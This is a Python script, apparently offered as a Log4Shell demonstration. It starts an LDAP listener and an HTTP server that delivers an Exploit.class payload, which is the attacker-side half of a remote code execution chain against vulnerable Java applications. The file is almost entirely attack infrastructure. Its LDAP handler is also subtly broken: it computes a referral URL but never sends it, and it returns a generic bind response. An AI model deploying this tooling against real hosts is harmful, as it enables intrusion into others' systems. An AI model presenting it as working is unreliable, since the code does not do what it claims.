import socket
import struct
import threading
import http.server
import socketserver
import os

# Simple LDAP Server for Log4Shell demonstration
class SimpleLDAPServer:
    def __init__(self, host='0.0.0.0', port=1389, http_port=8888):
        self.host = host
        self.port = port
        self.http_port = http_port

    def handle_ldap(self, conn, addr):
        try:
            print(f"[LDAP] Connection from {addr}")
            data = conn.recv(1024)

            # Simple LDAP response with referral to HTTP server
            # This is a basic LDAP referral response
            referral_url = f"http://{socket.gethostname()}:{self.http_port}/Exploit.class"

            # Basic LDAP result with referral
            response = bytearray([
                0x30, 0x0c,  # Sequence
                0x02, 0x01, 0x01,  # Message ID
                0x61, 0x07,  # Application 1 (Bind Response)
                0x0a, 0x01, 0x00,  # Result Code: Success
                0x04, 0x00,  # Matched DN: empty
                0x04, 0x00   # Error Message: empty
            ])

            conn.sendall(bytes(response))
            print(f"[LDAP] Sent referral response")

        except Exception as e:
            print(f"[LDAP] Error: {e}")
        finally:
            conn.close()

    def start_ldap_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        print(f"[LDAP] Server listening on {self.host}:{self.port}")

        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=self.handle_ldap, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def run(self):
        # Start LDAP server in thread
        ldap_thread = threading.Thread(target=self.start_ldap_server)
        ldap_thread.daemon = True
        ldap_thread.start()

        # Start HTTP server in main thread
        self.start_http_server()

    def start_http_server(self):
        os.chdir(os.path.dirname(os.path.abspath(__file__)))

        class ExploitHTTPHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[HTTP] Request: {self.path} from {self.client_address}")
                if self.path == '/Exploit.class':
                    try:
                        with open('Exploit.class', 'rb') as f:
                            content = f.read()
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/java-vm')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        print("[HTTP] Served Exploit.class")
                    except FileNotFoundError:
                        self.send_error(404, "Exploit.class not found")
                else:
                    super().do_GET()

            def log_message(self, format, *args):
                print(f"[HTTP] {format % args}")

        with socketserver.TCPServer(("", self.http_port), ExploitHTTPHandler) as httpd:
            print(f"[HTTP] Server listening on port {self.http_port}")
            httpd.serve_forever()

if __name__ == "__main__":
    server = SimpleLDAPServer()
    try:
        server.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down servers...")